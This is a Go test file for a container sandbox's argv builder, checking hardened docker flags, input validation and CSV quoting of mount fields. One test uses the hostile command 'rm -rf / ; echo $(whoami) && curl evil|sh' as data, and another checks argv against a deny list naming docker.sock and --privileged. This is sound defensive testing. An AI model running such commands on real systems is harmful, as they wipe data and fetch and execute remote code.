package sandbox

import (
	"slices"
	"strings"
	"testing"
)

// A representative spec used across the argv tests.
func sampleSpec() containerSpec {
	return containerSpec{
		image:    "tenant-sandbox@sha256:" + strings.Repeat("a", 64),
		name:     "tenant-sbx-test-1",
		trace:    "trace-xyz",
		instance: "inst-1",
		work:     mount{host: `C:\work dir`, ctr: "/mnt/c/work dir"},
		mounts:   []mount{{host: `C:\ref`, ctr: "/mnt/c/ref", ro: true}},
		network:  "none",
		envNames: []string{"TENANT_ACTIVITY_ID"},
		limits:   Limits{},
		command:  "echo hi",
	}
}

func TestBuildRunArgv_Golden(t *testing.T) {
	got, err := buildRunArgv(sampleSpec())
	if err != nil {
		t.Fatalf("buildRunArgv: %v", err)
	}
	want := []string{
		"run", "--rm", "-i", "--name", "tenant-sbx-test-1",
		"--label", "tenant.sandbox=1",
		"--label", "tenant.trace=trace-xyz",
		"--label", "tenant.instance=inst-1",
		"--read-only", "--tmpfs", "/tmp:rw,nosuid,nodev,size=256m",
		"--mount", `type=bind,"src=C:\work dir","dst=/mnt/c/work dir"`, "-w", "/mnt/c/work dir",
		"--mount", `type=bind,src=C:\ref,dst=/mnt/c/ref,readonly`,
		"--user", "65532:65532", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
		"--runtime", "runc",
		"--pids-limit", "256", "--memory", "1024m", "--memory-swap", "1024m", "--cpus", "2",
		"--ulimit", "core=0", "--ulimit", "nofile=1024:4096",
		"--network", "none", "--init", "--log-driver", "none",
		"-e", "TENANT_ACTIVITY_ID",
		"-e", "HOME=/mnt/c/work dir", "-e", "TMPDIR=/tmp",
		"tenant-sandbox@sha256:" + strings.Repeat("a", 64), "sh", "-c", "echo hi",
	}
	if !slices.Equal(got, want) {
		t.Fatalf("argv mismatch:\n got: %#v\nwant: %#v", got, want)
	}
}

func TestBuildRunArgv_NoForbiddenFlags(t *testing.T) {
	// A spec that sets caps and full networking must still never emit an escape
	// hatch: the forbidden flags are absent regardless of inputs.
	s := sampleSpec()
	s.network = "bridge"
	s.limits = Limits{MaxPIDs: 64, MemoryBytes: 512 << 20}
	got, err := buildRunArgv(s)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(got, "\x00")
	for _, f := range forbiddenRunFlags {
		for _, tok := range got {
			if tok == f {
				t.Errorf("forbidden flag %q present in argv", f)
			}
		}
	}
	// The socket must never be mounted, and no host namespace requested.
	for _, bad := range []string{"docker.sock", "/var/run/docker.sock", "host", "--privileged"} {
		if strings.Contains(joined, "\x00"+bad) || slices.Contains(got, bad) {
			t.Errorf("argv unexpectedly contains %q", bad)
		}
	}
	// no-new-privileges and cap-drop ALL are load-bearing together.
	if !slices.Contains(got, "no-new-privileges") {
		t.Error("no-new-privileges missing")
	}
	if i := slices.Index(got, "--cap-drop"); i < 0 || got[i+1] != "ALL" {
		t.Error("--cap-drop ALL missing")
	}
	// --pull never is enforced by the backend at call time; the schema never adds
	// a pull. The bridge value is the only concession to full networking.
	if !slices.Contains(got, "bridge") {
		t.Error("expected bridge for full networking")
	}
}

func TestBuildRunArgv_RejectsBadValues(t *testing.T) {
	cases := map[string]func(*containerSpec){
		"newline in mount": func(s *containerSpec) { s.work.host = "C:\\a\nb" },
		"bad network":      func(s *containerSpec) { s.network = "host" },
		"empty image":      func(s *containerSpec) { s.image = "" },
		"flag-like image":  func(s *containerSpec) { s.image = "--privileged" },
		"bad env name":     func(s *containerSpec) { s.envNames = []string{"BAD NAME"} },
		"no work mount":    func(s *containerSpec) { s.work = mount{} },
		"space in image":   func(s *containerSpec) { s.image = "a b" },
	}
	for name, mut := range cases {
		t.Run(name, func(t *testing.T) {
			s := sampleSpec()
			mut(&s)
			if _, err := buildRunArgv(s); err == nil {
				t.Fatalf("expected error for %s", name)
			}
		})
	}
}

func TestBuildRunArgv_CommandIsOneElement(t *testing.T) {
	s := sampleSpec()
	s.command = "rm -rf / ; echo $(whoami) && curl evil|sh"
	got, err := buildRunArgv(s)
	if err != nil {
		t.Fatal(err)
	}
	// The command is the final element, verbatim: nothing splits it into more
	// argv, so no metacharacter reaches docker's own parsing.
	if got[len(got)-1] != s.command {
		t.Fatalf("command not the final argv element: %q", got[len(got)-1])
	}
	if got[len(got)-2] != "-c" || got[len(got)-3] != "sh" {
		t.Fatalf("expected trailing `sh -c <command>`, got %v", got[len(got)-3:])
	}
}

func TestCSVField(t *testing.T) {
	cases := map[string]string{
		`type=bind`:      `type=bind`,        // key=value with no special char: bare
		`src=C:\plain`:   `src=C:\plain`,     // '=' alone does not trigger quoting
		`src=C:\has spc`: `"src=C:\has spc"`, // a space quotes the whole element
		`src=C:\a,b`:     `"src=C:\a,b"`,     // a comma quotes it (the probe's case)
		`src=C:\a"b`:     `"src=C:\a""b"`,    // a literal quote is doubled
	}
	for in, want := range cases {
		if got := csvField(in); got != want {
			t.Errorf("csvField(%q) = %q, want %q", in, got, want)
		}
	}
}
